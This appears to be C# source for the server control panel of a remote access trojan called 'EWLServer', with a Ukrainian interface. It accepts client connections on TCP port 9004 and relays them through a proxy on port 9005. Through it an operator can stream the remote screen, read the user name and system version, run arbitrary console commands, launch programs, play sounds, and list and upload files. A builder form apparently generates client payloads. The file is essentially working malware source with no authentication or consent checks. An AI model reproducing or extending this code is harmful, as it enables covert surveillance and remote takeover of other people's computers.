using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EWLServer
{
    public partial class MainForm : Form
    {
        private ushort uPort = 9004;

        private TcpListener server = null;
        private TcpListener proxyServer = null;
        private bool listening = false;

        private TcpClient client = null;
        private TcpClient proxyClient = null;
        private NetworkStream stream = null;
        private NetworkStream proxyStream = null;

        private System.Windows.Forms.Timer screenTimer;

        public MainForm()
        {
            server = new TcpListener(IPAddress.Any, uPort);
            proxyServer = new TcpListener(IPAddress.Any, uPort + 1);
            InitializeComponent();
            fmReinit.ImageAlign = ContentAlignment.MiddleCenter;
            fmReinit.Image = Icons.reinit;
            fmUpload.ImageAlign = ContentAlignment.MiddleCenter;
            fmUpload.Image = Icons.upload;
            FormClosing += Form1_FormClosing;
            Icons.InitIcons();

            screenTimer = new System.Windows.Forms.Timer();
            screenTimer.Enabled = false;
            screenTimer.Interval = 250;
            screenTimer.Tick += ScreenTimer_Tick;
        }

        private void ScreenTimer_Tick(object sender, EventArgs e)
        {
            if (client != null)
            {
                SendPacket(0x03, new byte[] { 0x0A });
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (stream != null)
            {
                stream.Close();
                stream = null;
                client.Close();
                client = null;
            }
            if (server != null)
            {
                server.Stop();
                server = null;
            }
            if (proxyStream != null)
            {
                proxyStream.Close();
                proxyStream = null;
                proxyClient.Close();
                proxyClient = null;
            }
            if (proxyServer != null)
            {
                proxyServer.Stop();
                proxyServer = null;
            }
        }

        private void Listen_Click(object sender, EventArgs e)
        {
            if (!listening)
            {
                new Thread(new ThreadStart(() =>
                {
                    server.Start();
                    listening = true;
                    while (Visible)
                    {
                        try
                        {
                            client = server.AcceptTcpClient();
                            stream = client.GetStream();
                            connStatus.Invoke(new MethodInvoker(() =>
                            {
                                connStatus.Text = "Підключення: " + client.Client.RemoteEndPoint.ToString();
                            }));
                            if (proxyClient != null)
                            {
                                byte[] connPk = PacketHelper.Wrap(0xFE,
                                    client.Client.RemoteEndPoint.ToString());
                                proxyStream.Write(connPk, 0, connPk.Length);
                            }
                            byte[] szBuf = new byte[4];
                            uint packetSize = 0;
                            int read = 0;
                            byte[] packet = null;
                            while (true)
                            {
                                if (read < 4)
                                {
                                    int rb = stream.Read(szBuf, read, 4 - read);
                                    if (rb == 0)
                                    {
                                        break;
                                    }
                                    read += rb;
                                }
                                if (read == 4)
                                {
                                    packetSize = BitConverter.ToUInt32(szBuf, 0);
                                    packet = new byte[packetSize];
                                }
                                if (read >= 4 && read < packetSize + 4)
                                {
                                    int rb = stream.Read(packet, read - 4, (int)(packetSize - read + 4));
                                    if (rb == 0)
                                    {
                                        break;
                                    }
                                    read += rb;
                                }
                                if (read == packetSize + 4)
                                {
                                    NewPacket(packet);
                                    if (proxyClient != null)
                                    {
                                        byte[] npk = PacketHelper.Wrap(packet);
                                        proxyStream.Write(npk, 0, npk.Length);
                                    }
                                    packetSize = 0;
                                    read = 0;
                                    packet = null;
                                }
                            }
                            stream.Close();
                            stream = null;
                            client.Close();
                            client = null;
                            connStatus.Invoke(new MethodInvoker(() =>
                            {
                                connStatus.Text = "Підключення: відсутнє";
                            }));
                            if (proxyClient != null)
                            {
                                byte[] disconnPk = PacketHelper.Wrap(0xFD);
                                proxyStream.Write(disconnPk, 0, disconnPk.Length);
                            }
                        }
                        catch (Exception)
                        {
                            if (client != null)
                            {
                                stream.Close();
                                stream = null;
                                client.Close();
                                client = null;
                            }
                            if (!Disposing && !IsDisposed)
                            {
                                connStatus.Invoke(new MethodInvoker(() =>
                                {
                                    connStatus.Text = "Підключення: відсутнє";
                                }));
                            }
                            if (proxyClient != null)
                            {
                                byte[] disconnPk = PacketHelper.Wrap(0xFD);
                                proxyStream.Write(disconnPk, 0, disconnPk.Length);
                            }
                        }
                    }
                })).Start();
                new Thread(new ThreadStart(() =>
                {
                    proxyServer.Start();
                    while (Visible)
                    {
                        try
                        {
                            proxyClient = proxyServer.AcceptTcpClient();
                            proxyStream = proxyClient.GetStream();
                            if (client != null)
                            {
                                byte[] connPk = PacketHelper.Wrap(0xFE,
                                    client.Client.RemoteEndPoint.ToString());
                                proxyStream.Write(connPk, 0, connPk.Length);
                            }
                            byte[] szBuf = new byte[4];
                            uint packetSize = 0;
                            int read = 0;
                            byte[] packet = null;
                            while (true)
                            {
                                if (read < 4)
                                {
                                    int rb = proxyStream.Read(szBuf, read, 4 - read);
                                    if (rb == 0)
                                    {
                                        break;
                                    }
                                    read += rb;
                                }
                                if (read == 4)
                                {
                                    packetSize = BitConverter.ToUInt32(szBuf, 0);
                                    packet = new byte[packetSize];
                                }
                                if (read >= 4 && read < packetSize + 4)
                                {
                                    int rb = proxyStream.Read(packet, read - 4, (int)(packetSize - read + 4));
                                    if (rb == 0)
                                    {
                                        break;
                                    }
                                    read += rb;
                                }
                                if (read == packetSize + 4)
                                {
                                    if (client != null)
                                    {
                                        byte[] npk = PacketHelper.Wrap(packet);
                                        stream.Write(npk, 0, npk.Length);
                                    }
                                    packetSize = 0;
                                    read = 0;
                                    packet = null;
                                }
                            }
                            proxyStream.Close();
                            proxyStream = null;
                            proxyClient.Close();
                            proxyClient = null;
                        }
                        catch (Exception)
                        {
                            if (proxyClient != null)
                            {
                                proxyStream.Close();
                                proxyStream = null;
                                proxyClient.Close();
                                proxyClient = null;
                            }
                        }
                    }
                })).Start();
                listen.Enabled = false;
            }
        }

        private void NewPacket(byte[] packet)
        {
            byte cmd = packet[0];
            switch (cmd)
            {
                case 0x00: // system version
                    string ver = Encoding.UTF8.GetString(packet, 1, packet.Length - 1);
                    systemVer.Invoke(new MethodInvoker(() =>
                    {
                        systemVer.Text = "Система: " + ver;
                    }));
                    break;
                case 0x02: // user name
                    string uname = Encoding.UTF8.GetString(packet, 1, packet.Length - 1);
                    userName.Invoke(new MethodInvoker(() =>
                    {
                        userName.Text = "Користувач: " + uname;
                    }));
                    break;
                case 0x03: // screen
                    Bitmap bmp = new Bitmap(new MemoryStream(packet, 1, packet.Length - 1));
                    screen.Invoke(new MethodInvoker(() =>
                    {
                        screen.Image = bmp;
                    }));
                    break;
                case 0x06: // file manager (list)
                    int offset = 1; // 1st byte = cmd
                    fmFiles.Invoke(new MethodInvoker(() =>
                    {
                        fmFiles.Items.Clear();
                    }));
                    while (offset < packet.Length)
                    {
                        ushort len = BitConverter.ToUInt16(packet, offset);
                        offset += 2;
                        string file = Encoding.UTF8.GetString(packet, offset, len);
                        offset += len;
                        fmFiles.Invoke(new MethodInvoker(() =>
                        {
                            fmFiles.Items.Add(file);
                        }));
                    }
                    break;
                case 0xFF: // client error
                    string message = Encoding.UTF8.GetString(packet, 1, packet.Length - 1);
                    Invoke(new MethodInvoker(() =>
                    {
                        MessageBox.Show(message, "EWL Server - Помилка клієнта", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    }));
                    break;
            }
        }

        private void SendPacket(byte cmd)
        {
            if (client == null)
            {
                return;
            }
            byte[] pk = PacketHelper.Wrap(cmd);
            stream.Write(pk, 0, pk.Length);
        }

        private void SendPacket(byte cmd, byte[] data)
        {
            if (client == null)
            {
                return;
            }
            byte[] pk = PacketHelper.Wrap(cmd, data);
            stream.Write(pk, 0, pk.Length);
        }

        private void GetInfo_Click(object sender, EventArgs e)
        {
            SendPacket(0x00);
            SendPacket(0x02);
            SendPacket(0x03, new byte[] { 0x0A });
            SendPacket(0x06, new byte[] { 0x01 });
        }

        private void ShellCommand_Click(object sender, EventArgs e)
        {
            if (client == null)
            {
                return;
            }
            Form frm = new ActionForm();
            frm.ClientSize = new Size(460, 80);
            Label hint = new Label();
            hint.Location = new Point(10, 10);
            hint.AutoSize = true;
            hint.Text = "Введіть команду консолі (наприкл. taskkill):";
            frm.Controls.Add(hint);
            TextBox shcmd = new TextBox();
            shcmd.Width = 440;
            shcmd.Location = new Point(10, 26);
            frm.Controls.Add(shcmd);
            Button exec = new Button();
            exec.Width = 80;
            exec.Height = 24;
            exec.Text = "Виконати";
            exec.Location = new Point(370, 50);
            exec.Click += (object s, EventArgs ev) =>
            {
                if (shcmd.Text.Trim(' ') != "")
                {
                    byte[] pk = PacketHelper.Wrap(0x01, Encoding.UTF8.GetBytes(shcmd.Text));
                    stream.Write(pk, 0, pk.Length);
                    frm.Close();
                }
            };
            frm.Controls.Add(exec);
            frm.ShowDialog();
        }

        private void EnableScreen_CheckedChanged(object sender, EventArgs e)
        {
            screenTimer.Enabled = enableScreen.Checked;
        }

        private void StartProgram_Click(object sender, EventArgs e)
        {
            if (client == null)
            {
                return;
            }
            Form frm = new ActionForm();
            frm.ClientSize = new Size(460, 80);
            Label hint = new Label();
            hint.Location = new Point(10, 10);
            hint.AutoSize = true;
            hint.Text = "Введіть назву програми (наприкл. calc):";
            frm.Controls.Add(hint);
            TextBox shcmd = new TextBox();
            shcmd.Width = 440;
            shcmd.Location = new Point(10, 26);
            frm.Controls.Add(shcmd);
            Button exec = new Button();
            exec.Width = 80;
            exec.Height = 24;
            exec.Text = "Запустити";
            exec.Location = new Point(370, 50);
            exec.Click += (object s, EventArgs ev) =>
            {
                if (shcmd.Text.Trim(' ') != "")
                {
                    byte[] pk = PacketHelper.Wrap(0x04, Encoding.UTF8.GetBytes(shcmd.Text));
                    stream.Write(pk, 0, pk.Length);
                    frm.Close();
                }
            };
            frm.Controls.Add(exec);
            frm.ShowDialog();
        }

        private void PlaySound_Click(object sender, EventArgs e)
        {
            if (client == null)
            {
                return;
            }
            bool done = false;
            Form frm = new ActionForm();
            frm.ClientSize = new Size(460, 80);
            Label hint = new Label();
            hint.Location = new Point(10, 10);
            hint.AutoSize = true;
            hint.Text = "Оберіть файл .mp3:";
            frm.Controls.Add(hint);
            OpenFileDialog ofd = new OpenFileDialog()
            {
                AddExtension = true,
                AutoUpgradeEnabled = true,
                CheckFileExists = true,
                DefaultExt = ".mp3",
                DereferenceLinks = true,
                Filter = "MP3 Audio (*.mp3)|*.mp3",
                FilterIndex = 0,
                Multiselect = false,
                RestoreDirectory = true
            };
            Button shcmd = new Button();
            shcmd.Width = 80;
            shcmd.Height = 24;
            shcmd.Text = "Огляд...";
            shcmd.Location = new Point(10, 26);
            shcmd.Click += (object s, EventArgs ev) =>
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    done = true;
                }
            };
            frm.Controls.Add(shcmd);
            CheckBox loop = new CheckBox();
            loop.Width = 80;
            loop.Height = 24;
            loop.Text = "Повторювати";
            loop.Location = new Point(100, 26);
            frm.Controls.Add(loop);
            Button exec = new Button();
            exec.Width = 80;
            exec.Height = 24;
            exec.Text = "Програти";
            exec.Location = new Point(370, 50);
            exec.Click += (object s, EventArgs ev) =>
            {
                if (ofd.FileName != "" && done)
                {
                    byte[] audio = File.ReadAllBytes(ofd.FileName);
                    byte[] audiof = new byte[audio.Length + 1];
                    audiof[0] = loop.Checked ? (byte)0x01 : (byte)0x00;
                    Array.Copy(audio, 0, audiof, 1, audio.Length);
                    byte[] pk = PacketHelper.Wrap(0x05, audiof);
                    stream.Write(pk, 0, pk.Length);
                    frm.Close();
                }
            };
            frm.Controls.Add(exec);
            frm.ShowDialog();
        }

        private void FmReinit_Click(object sender, EventArgs e)
        {
            SendPacket(0x06, new byte[] { 0x00 });
        }

        private void FmUpload_Click(object sender, EventArgs e)
        {
            if (client == null)
            {
                return;
            }
            OpenFileDialog ofd = new OpenFileDialog()
            {
                AddExtension = true,
                AutoUpgradeEnabled = true,
                CheckFileExists = true,
                DefaultExt = ".mp3",
                DereferenceLinks = true,
                Filter = "All Files (*.*)|*.*",
                FilterIndex = 0,
                Multiselect = false,
                RestoreDirectory = true
            };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                byte[] file = File.ReadAllBytes(ofd.FileName);
                ushort fnSz = (ushort)Encoding.UTF8.GetByteCount(ofd.SafeFileName);
                byte[] bFnSz = BitConverter.GetBytes(fnSz);
                byte[] idata = new byte[3 + fnSz + file.Length];
                idata[0] = 0x02; // fm command upload
                Array.Copy(bFnSz, 0, idata, 1, 2);
                Array.Copy(Encoding.UTF8.GetBytes(ofd.SafeFileName), 0, idata, 3, fnSz);
                Array.Copy(file, 0, idata, 3 + fnSz, file.Length);
                byte[] pk = PacketHelper.Wrap(0x06, idata);
                stream.Write(pk, 0, pk.Length);
            }
        }

        private void Create_Click(object sender, EventArgs e)
        {
            BuilderForm bf = new BuilderForm();
            bf.ShowDialog();
        }
    }
}
